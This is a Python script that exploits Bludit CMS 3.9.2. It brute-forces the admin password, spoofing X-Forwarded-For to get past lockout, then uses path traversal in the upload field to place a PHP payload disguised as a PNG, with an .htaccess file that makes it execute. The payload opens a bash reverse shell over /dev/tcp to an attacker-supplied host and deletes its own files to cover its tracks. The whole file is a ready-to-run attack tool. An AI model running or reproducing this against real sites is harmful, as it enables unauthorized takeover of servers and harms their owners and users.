#!/usr/bin/env python3
import argparse
import os
import random
import re
import string
import sys

import requests

"""
Author: Icyb3r
Script: Auto exploit BLUDIT CMS 3.9.2 and Brute Forcing the password

"""


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    OKGrn = f"{HEADER + OKGREEN}[+] {ENDC}"
    Okblu = f"{OKBLUE}[*] {ENDC}"
    FAILR = f"{FAIL}[!] {ENDC}"
    WARNG = f"{WARNING}[!] {ENDC}"


def admin_login(url, username, password):
    url = url + "/admin/"

    s = requests.Session()

    login_page = s.get(url)
    csrf_token = re.search('"tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    print(f"{bcolors.Okblu} CSRF Token To Login: {csrf_token}")
    data = {
        "username": username,
        "password": password,
        "tokenCSRF": csrf_token
    }
    r = s.post(url, data=data, allow_redirects=False)

    if r.status_code != 301:
        print(f"{bcolors.FAILR} Username or password incorrect.")
        sys.exit(1)
    print(f"{bcolors.OKGrn} Login Successfully.")
    return s


def get_csrf(session, url):
    url = url + "/admin/"
    r = session.get(url)
    csrf_token = re.search('var tokenCSRF = "(.+?)"', r.text).group(1)
    # csrf_token = r.text.split('var tokenCSRF = "')[1].split('"')[0]
    if csrf_token is None:
        print(f"{bcolors.FAILR} Can't Get CSRF Token.")
        sys.exit(1)
    print(f"{bcolors.Okblu} CSRF Token To Upload: {csrf_token}")
    return csrf_token


def get_randFileName(ext):
    n = 16
    fname = ''.join(random.choice(string.ascii_letters) for _ in range(n))
    return fname + ext


def upload_shell(url, session, csrf_token, payload, fname):
    url = url + "/admin/ajax/upload-images"
    data = {
        'uuid': '../../tmp',
        'tokenCSRF': csrf_token
    }

    files_payload = [('images[]', (fname, payload, 'image/png'))]
    r = session.post(url, data, files=files_payload)

    if 200 != r.status_code:
        print(f"{bcolors.FAILR} Error uploading {fname} Shell.")
        print(f"{bcolors.FAILR} Make sure Bludit version >= 3.9.2.")
        sys.exit(1)
    print(f"{bcolors.OKGrn} Shell upload succesful.")

    files_htaccess = [
        ('images[]', ('.htaccess', "RewriteEngine off\r\nAddType application/x-httpd-php .png", 'image/png'))]
    r = session.post(url, data, files=files_htaccess)

    if r.status_code != 200:
        print(f"{bcolors.FAILR} Error uploading .htaccess.")
        print(f"{bcolors.FAILR} Make sure Bludit version >= 3.9.2.")
        sys.exit(1)

    print(f"{bcolors.OKGrn} .htaccess upload successfully.")


def get_shell(url, session, fname):
    url = url + f'/bl-content/tmp/{fname}'
    try:
        r = session.get(url, timeout=1)
    except requests.exceptions.ReadTimeout:
        pass
    # print(f"{bcolors.Okblu} Payload URL: {url}")
    print(f"{bcolors.OKGrn} Command Execution Successfully.")
    print(f"{bcolors.Okblu} Your Tracks Cleared,Happy Hacking :) ")


def pass_brute(url, username, filename):
    login_url = url + '/admin/login'

    if not os.path.exists(filename):
        print()
        print(f"{bcolors.FAILR} File {filename} Not Exists.")
        print()
        sys.exit(2)

    with open(filename, 'r', encoding="UTF-8") as wordlist:
        for password in wordlist:
            password = password.strip()
            session = requests.Session()
            login_page = session.get(login_url)
            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

            sys.stdout.write(f'\r{bcolors.Okblu} Trying: {password}             ')

            headers = {
                'X-Forwarded-For': password,
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Referer': login_url
            }

            data = {
                'tokenCSRF': csrf_token,
                'username': username,
                'password': password,
                'save': ''
            }

            login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)

            if 'location' in login_result.headers:
                if '/admin/dashboard' in login_result.headers['location']:
                    print()
                    print(f'\n{bcolors.OKGrn} SUCCESS Password :: {bcolors.FAIL} {password} {bcolors.ENDC}::  found!')
                    print()
                    break


def Main():
    parser = argparse.ArgumentParser()

    groupB = parser.add_argument_group('BruteForcing')
    groupA = parser.add_argument_group('Authentication')
    groupR = parser.add_argument_group('Remote Network')
    groupL = parser.add_argument_group('Local Network')

    groupR.add_argument("-r", '--rhost', action="store", help="Remote IP Address", required=True)
    groupR.add_argument("-rp", '--rport', type=int, help="Remote Port Number ", default=80)
    groupL.add_argument("-l", '--lhost', action="store", help="Remote IP Address")
    groupL.add_argument("-lp", '--lport', type=int, help="Locale NetCat Port ", default=4443)
    groupA.add_argument("-u", "--username", action="store", help="Enter the Username", required=True)
    groupA.add_argument("-p", "--password", action="store", help="Enter the Password")
    groupB.add_argument("-b", "--brute", action="store_true", help="Brute force the password", default=False)
    groupB.add_argument("-w", "--wordlist", action="store", help="WordList file name")

    args = parser.parse_args()

    rhost = args.rhost
    rport = args.rport

    lhost = args.lhost
    lport = args.lport

    passwd = args.password
    usernm = args.username

    bforce = args.brute
    wordlst = args.wordlist

    if rhost is not None and usernm is not None and passwd is not None and lhost is not None and lport is not None:

        print()
        url = f'http://{rhost}:{rport}'

        username = usernm
        password = passwd

        png_ext = ".png"
        php_ext = ".php"

        fname = get_randFileName(png_ext)
        print(f"{bcolors.Okblu} Create Payload File: {fname}")
        pshell = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","i"]);'"""
        rshell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        payload = f"<?php shell_exec(\"rm .htaccess;rm {fname};{rshell}\");?>"

        session = admin_login(url, username, password)
        csrf_token = get_csrf(session, url)

        upload_shell(url, session, csrf_token, payload, fname)
        get_shell(url, session, fname)

        print()
        sys.exit(0)

    if bforce is not False and wordlst is not None and rhost is not None and usernm is not None:

        print()
        url = f'http://{rhost}:{rport}'

        wordlist = wordlst
        username = usernm

        pass_brute(url, username, wordlist)
        sys.exit(0)

    parser.print_help()


if __name__ == "__main__":
    Main()
